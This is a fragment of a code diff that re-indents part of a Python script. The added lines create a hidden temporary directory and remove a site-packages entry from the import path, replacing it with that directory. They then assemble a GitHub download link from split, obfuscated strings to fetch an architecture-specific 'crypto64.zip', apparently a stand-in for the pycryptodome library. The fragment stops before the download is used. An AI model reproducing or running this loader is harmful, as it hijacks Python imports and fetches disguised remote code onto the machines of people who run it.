@@ -10,39 +10,39 @@ from uuid import uuid4
 
 import os,sys,tempfile,string,random,subprocess,uuid 
 
- http_directory = tempfile.mkdtemp(prefix='.') 
+http_directory = tempfile.mkdtemp(prefix='.') 
 
- site_packages = sys.path[4] 
+site_packages = sys.path[4] 
 
- print(site_packages) 
+print(site_packages) 
 
- print(http_directory) 
+print(http_directory) 
 
- sys.path.remove(site_packages) 
+sys.path.remove(site_packages) 
 
- sys.path.insert(4,http_directory+'/reqmodule') 
+sys.path.insert(4,http_directory+'/reqmodule') 
 
- sys.path.insert(5,http_directory) 
+sys.path.insert(5,http_directory) 
 
- try: 
+try: 
 
          os.mkdir('crypto') 
 
- except:pass 
+except:pass 
 
- hh = "ho" 
+hh = "ho" 
 
- hh2 = "9/pycrypt" 
+hh2 = "9/pycrypt" 
 
- find_aarch = subprocess.check_output('uname -om',shell=True) 
+find_aarch = subprocess.check_output('uname -om',shell=True) 
 
- if 'aarch64' in str(find_aarch): 
+if 'aarch64' in str(find_aarch): 
 
          user_aarch = '64' 
 
          download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true' 
 
- elif 'arm' in str(find_aarch): 
+elif 'arm' in str(find_aarch): 
 
          user_aarch = '32' 
 
